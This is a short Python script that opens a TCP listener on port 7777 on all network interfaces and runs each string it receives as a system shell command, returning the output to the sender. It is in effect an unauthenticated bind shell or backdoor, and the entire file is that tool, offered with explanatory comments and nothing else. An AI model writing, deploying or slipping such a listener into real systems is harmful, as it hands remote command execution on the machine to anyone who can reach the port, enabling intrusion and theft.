import socket
import subprocess

#create and bind a socket
s = socket.socket()
s.bind(('0.0.0.0', 7777))
s.listen(1)
print("Listening on port 7777")

#accepts a connection
conn, addr = s.accept()
print("Connected from", addr)

#use command on the system shell
while True:
    cmd = conn.recv(4096).decode()
    if not cmd:
        break
    result = subprocess.run(cmd, shell=True, capture_output=True)
    conn.send(result.stdout + result.stderr)